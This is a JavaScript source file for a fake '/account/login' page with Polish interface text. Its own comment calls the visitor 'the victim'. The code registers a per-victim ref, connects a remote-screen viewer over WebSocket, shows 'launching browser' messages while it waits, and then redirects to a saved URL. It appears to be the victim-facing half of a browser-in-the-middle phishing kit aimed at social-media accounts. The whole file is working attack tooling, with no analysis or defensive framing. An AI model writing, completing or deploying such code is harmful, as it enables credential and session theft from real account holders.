// Viewer page — loaded at /account/login?ref=<numeric-ref>
// The ref serves as the access token for the victim's WebSocket connection.
const params = new URLSearchParams(location.search);
const ref = params.get('ref') || '';

const viewer = new SocialPanelViewer(document.querySelector('#screen'));
const overlay = document.querySelector('#loadingOverlay');

function fail(msg) {
  document.body.innerHTML = `<p style="color:#fff;padding:2em;font:16px sans-serif">${msg}</p>`;
}

let _ready = false;
viewer.onReady = () => { _ready = true; if (overlay) overlay.classList.add('hidden'); };
viewer.onredirect = (url) => { const saved = localStorage.getItem('return_url'); window.location.href = saved || url || '/'; };

if (!ref) { fail('Brak ref. Wróć do panelu.'); }
else {
  let _accountId = null;
  let _retries = 0;

  function setOverlayText(msg) {
    if (overlay) {
      let p = overlay.querySelector('.overlay-status');
      if (!p) { p = document.createElement('p'); p.className = 'overlay-status'; p.style.cssText = 'color:#fff;font:14px sans-serif;margin-top:12px;opacity:.7'; overlay.appendChild(p); }
      p.textContent = msg;
    }
  }

  function connect() {
    viewer.onclose = (ev) => {
      if (_ready) return;
      if (ev.code === 4409 && _retries < 20) {
        _retries++;
        setOverlayText(`Uruchamiam przeglądarkę… (${_retries})`);
        setTimeout(connect, 2000);
      } else if (ev.code === 4404) {
        fail('Nieznany link.');
      } else {
        fail(`Błąd połączenia (${ev.code || 'WS closed'}).`);
      }
    };
    viewer.connect(_accountId, ref);
  }

  fetch(`/api/account-by-ref/${encodeURIComponent(ref)}/start`, {
    method: 'POST',
    credentials: 'same-origin',
  })
    .then(async (res) => {
      if (res.status === 404) { fail('Nieznany link.'); return; }
      const { accountId } = await res.json();
      _accountId = accountId;
      setOverlayText('Uruchamiam przeglądarkę…');
      connect();
    })
    .catch(() => fail('Błąd połączenia.'));
}
